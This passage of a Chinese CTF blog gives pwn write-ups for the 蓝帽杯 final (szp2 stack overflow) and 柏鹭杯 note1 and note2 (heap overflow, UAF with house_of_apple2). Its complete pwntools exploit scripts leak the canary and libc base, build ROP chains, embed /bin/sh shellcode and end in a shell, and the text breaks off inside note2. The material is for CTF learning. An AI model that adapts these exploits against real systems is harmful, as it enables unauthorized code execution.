<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">we_input * <span class="number">56006392793428440965060594343955737638876552919041519193476344215226028549209672868995436445345986471</span> == <span class="number">51748409119571493927314047697799213641286278894049840228804594223988372501782894889443165173295123444031074892600769905627166718788675801</span></span><br></pre></td></tr></table></figure>



<h2 id="决赛"><a href="#决赛" class="headerlink" title="决赛"></a>决赛</h2><h3 id="szp2"><a href="#szp2" class="headerlink" title="szp2"></a>szp2</h3><p>去除了符号表，不过我们通过字符串就可以知道程序在干什么，一道虽然看上去繁杂的题目，其实只需要利用一处的栈溢出漏洞就可以实现攻击，漏洞如下（两次相同位置的栈溢出）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">memset</span>(v151, <span class="number">0</span>, <span class="keyword">sizeof</span>(v151));</span><br><span class="line">    v152 = <span class="number">0</span>;</span><br><span class="line">    sub_1B030((__int64)<span class="string">&quot;你试着给她发短信说道:&quot;</span>);</span><br><span class="line">    sub_64150(<span class="number">0LL</span>, v151, <span class="number">256LL</span>);		<span class="comment">// 栈溢出</span></span><br><span class="line">    sub_1B030((__int64)<span class="string">&quot;十分钟过去了，你没有得到回应……&quot;</span>);</span><br><span class="line">    sub_2D2B0((__int64)<span class="string">&quot;十分钟过去了，你没有得到回应……&quot;</span>, (__int64)v151, v131, v132, v133, v134);</span><br><span class="line">    sub_1B030((__int64)<span class="string">&quot;你盯着屏幕上的文字:%s&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)v151);</span><br><span class="line">    sub_2D2B0((__int64)<span class="string">&quot;你盯着屏幕上的文字:%s&quot;</span>, (__int64)v151, v135, v136, v137, v138);</span><br><span class="line">    sub_1B030((__int64)<span class="string">&quot;又发了一条短信:&quot;</span>);</span><br><span class="line">    sub_64150(<span class="number">0LL</span>, v151, <span class="number">256LL</span>);		<span class="comment">// 栈溢出</span></span><br><span class="line">    sub_1B030((__int64)<span class="string">&quot;信息就像石沉大海，惊不起一丝波澜……&quot;</span>);</span><br><span class="line">    sub_2D2B0((__int64)<span class="string">&quot;信息就像石沉大海，惊不起一丝波澜……&quot;</span>, (__int64)v151, v139, v140, v141, v142);</span><br><span class="line">    sub_1B030((__int64)<span class="string">&quot;俗话说“事出反常必有妖”，感情中也是同样的道理，如果你遇到一个人，各个方面都符合甚至超出你对另一半的预期，重点是ta还特别上赶着你，那么不要高兴太早，你很可能遇到了骗子。&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>题目是静态链接，所以vmmap中看不到libc，不过我们可以找到可以用的gadget片段，WP如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./szp2&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(<span class="string">&#x27;47.95.8.59&#x27;</span>, <span class="number">33903</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./szp2&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line">sh_x86_18=<span class="string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x86_20=<span class="string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x64_21=<span class="string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">#https://www.exploit-db.com/shellcodes</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;请选择: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;确定角色?确认后无法更改(Y/n)&#x27;</span>, <span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">    sh.recv()</span><br><span class="line">    s(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    sh.recv()</span><br><span class="line">    s(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;账户名:&#x27;</span>, <span class="string">b&#x27;zyy&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;你的积蓄:￥&#x27;</span>, <span class="string">b&#x27;100&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;充值金额:￥&#x27;</span>, <span class="string">b&#x27;10&#x27;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">s(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">s(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">sa(<span class="string">&#x27;你试着给她发短信说道:&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x98</span> + <span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">sa(<span class="string">&#x27;十分钟过去了，你没有得到回应……&#x27;</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;aaaaaab&#x27;</span>)</span><br><span class="line">canary = u64(<span class="string">b&#x27;\x00&#x27;</span> + r(<span class="number">7</span>))</span><br><span class="line">stack = uu64()</span><br><span class="line">lg(<span class="string">&#x27;canary&#x27;</span>)</span><br><span class="line">lg(<span class="string">&#x27;stack&#x27;</span>)</span><br><span class="line">s(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">sa(<span class="string">&#x27;又发了一条短信:&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x98</span> + p64(canary) + p64(stack))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    sh.recv()</span><br><span class="line">    s(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;请选择: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;确定角色?确认后无法更改(Y/n)&#x27;</span>, <span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">    sh.recv()</span><br><span class="line">    s(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    sh.recv()</span><br><span class="line">    s(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;账户名:&#x27;</span>, <span class="string">b&#x27;zyy&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;你的积蓄:￥&#x27;</span>, <span class="string">b&#x27;100&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;充值金额:￥&#x27;</span>, <span class="string">b&#x27;10&#x27;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">s(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">s(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">sa(<span class="string">&#x27;你试着给她发短信说道:&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0xa8</span>)</span><br><span class="line">sa(<span class="string">&#x27;十分钟过去了，你没有得到回应……&#x27;</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">codebase = uu64() - <span class="number">0xb885</span></span><br><span class="line">lg(<span class="string">&#x27;codebase&#x27;</span>)</span><br><span class="line">s(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p_rax_r = codebase + <span class="number">0x0000000000064d97</span></span><br><span class="line">p_rdi_r = codebase + <span class="number">0x0000000000009cc2</span></span><br><span class="line">p_rsi_r = codebase + <span class="number">0x0000000000018c9e</span></span><br><span class="line">p_rdx_r = codebase + <span class="number">0x0000000000009bcf</span></span><br><span class="line">syscall = codebase + <span class="number">0x0000000000009673</span></span><br><span class="line">pld = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">pld = pld.ljust(<span class="number">0x98</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">pld += p64(canary) + p64(<span class="number">0</span>)</span><br><span class="line">pld += p64(p_rax_r) + p64(<span class="number">59</span>)</span><br><span class="line">pld += p64(p_rdi_r) + p64(stack - <span class="number">0xd0</span>)</span><br><span class="line">pld += p64(p_rsi_r) + p64(<span class="number">0</span>)</span><br><span class="line">pld += p64(p_rdx_r) + p64(<span class="number">0</span>)</span><br><span class="line">pld += p64(syscall)</span><br><span class="line">sa(<span class="string">&#x27;又发了一条短信:&#x27;</span>, pld)</span><br><span class="line">sh.recv()</span><br><span class="line">s(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">s(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>蓝帽杯</tag>
      </tags>
  </entry>
  <entry>
    <title>2022 柏鹭杯</title>
    <url>/2022/09/19/CTF/2022%E6%9F%8F%E9%B9%AD%E6%9D%AF/</url>
    <content><![CDATA[<h2 id="note1"><a href="#note1" class="headerlink" title="note1"></a>note1</h2><p>存在两个漏洞，一个是在更新tag的时候<code>scanf(&quot;%s&quot;)</code>会将tag填充满，并将字符串的结尾附上<code>\x00</code>，注意在开始用gets对tag输入时是填不满的，如果输入8个字符是会报错的；二是在更新name的时候没有及时更新name的长度，导致产生堆块的溢出。</p>
<span id="more"></span>

<p>WP如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding = utf-8</span></span><br><span class="line"><span class="keyword">import</span> code</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">    sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./note1&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./note1&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line">sh_x86_18=<span class="string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x86_20=<span class="string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x64_21=<span class="string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">#https://www.exploit-db.com/shellcodes</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params"><span class="built_in">id</span>, name_len, name, tag, func</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;id: &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    sla(<span class="string">&#x27;name_length: &#x27;</span>, <span class="built_in">str</span>(name_len))</span><br><span class="line">    sla(<span class="string">&#x27;name: &#x27;</span>, name)</span><br><span class="line">    sla(<span class="string">&#x27;tag: &#x27;</span>, tag)</span><br><span class="line">    sla(<span class="string">&#x27;func: &#x27;</span>, <span class="built_in">str</span>(func))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_name</span>(<span class="params"><span class="built_in">id</span>, name_len, name</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;id: &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    sla(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;name_length: &#x27;</span>, <span class="built_in">str</span>(name_len))</span><br><span class="line">    sla(<span class="string">&#x27;name: &#x27;</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_tag</span>(<span class="params"><span class="built_in">id</span>, tag</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;id: &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    sla(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;new tag: &#x27;</span>, tag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_func</span>(<span class="params"><span class="built_in">id</span>, func</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;id: &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    sla(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)    </span><br><span class="line">    sla(<span class="string">&#x27;func: &#x27;</span>, <span class="built_in">str</span>(func))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">call</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)  </span><br><span class="line">    sla(<span class="string">&#x27;id: &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">id</span>))  </span><br><span class="line"></span><br><span class="line">new(<span class="number">0</span>, <span class="number">0x400</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x200</span>, <span class="string">b&#x27;pursue&#x27;</span>, <span class="number">2</span>)</span><br><span class="line">edit_tag(<span class="number">0</span>, <span class="string">b&#x27;abcdefgh&#x27;</span>)</span><br><span class="line">edit_func(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">call(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">&#x27;abcdefgh&#x27;</span>)</span><br><span class="line">code_base = u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x131B</span></span><br><span class="line">lg(<span class="string">&#x27;code_base&#x27;</span>)</span><br><span class="line">puts_got = code_base + elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">edit_name(<span class="number">0</span>, <span class="number">0x100</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line">new(<span class="number">1</span>, <span class="number">0x600</span>, <span class="string">b&#x27;pursue&#x27;</span>, <span class="string">b&#x27;pursue&#x27;</span>, <span class="number">2</span>)</span><br><span class="line">pld = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x100</span> </span><br><span class="line">pld += p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>)</span><br><span class="line">pld += <span class="string">b&#x27;abcdefgh&#x27;</span> + p64(code_base + <span class="number">0x131B</span>) + p64(puts_got)</span><br><span class="line">edit_name(<span class="number">0</span>, <span class="number">0x201</span>, pld)</span><br><span class="line"></span><br><span class="line">call(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">&#x27;name: &#x27;</span>)</span><br><span class="line">libc_base = uu64() - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pld = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x100</span> </span><br><span class="line">pld += p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>)</span><br><span class="line">pld += <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(sys_addr)</span><br><span class="line">edit_name(<span class="number">0</span>, <span class="number">0x201</span>, pld)</span><br><span class="line"></span><br><span class="line">call(<span class="number">1</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="note2"><a href="#note2" class="headerlink" title="note2"></a>note2</h2><p>存在uaf的漏洞，使得我们可以在fastbin中构造<code>double free</code>，通过申请一个堆块将其他堆块塞入tcache中，就可以任意地址分配了，之后劫持<code>IO_list_all</code>打<code>house_of_apple2</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">    sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./note2&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./note2&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line">sh_x86_18=<span class="string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x86_20=<span class="string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x64_21=<span class="string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">#https://www.exploit-db.com/shellcodes</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x50a37 posix_spawn(rsp+0x1c, &quot;/bin/sh&quot;, 0, rbp, rsp+0x60, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string">  rbp == NULL || (u16)[rbp] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xebcf1 execve(&quot;/bin/sh&quot;, r10, [rbp-0x70])</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  address rbp-0x78 is writable</span></span><br><span class="line"><span class="string">  [r10] == NULL || r10 == NULL</span></span><br><span class="line"><span class="string">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xebcf5 execve(&quot;/bin/sh&quot;, r10, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  address rbp-0x78 is writable</span></span><br><span class="line"><span class="string">  [r10] == NULL || r10 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xebcf8 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  address rbp-0x78 is writable</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    sla(<span class="string">&#x27;------------&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index?&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&#x27;Size?&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&#x27;Enter content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;------------&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index?&#x27;</span>, <span class="built_in">str</span>(idx))   </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;------------&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index?&#x27;</span>, <span class="built_in">str</span>(idx))   </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leave</span>():</span><br><span class="line">    sla(<span class="string">&#x27;------------&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i, <span class="number">0x108</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 0 - 8</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span 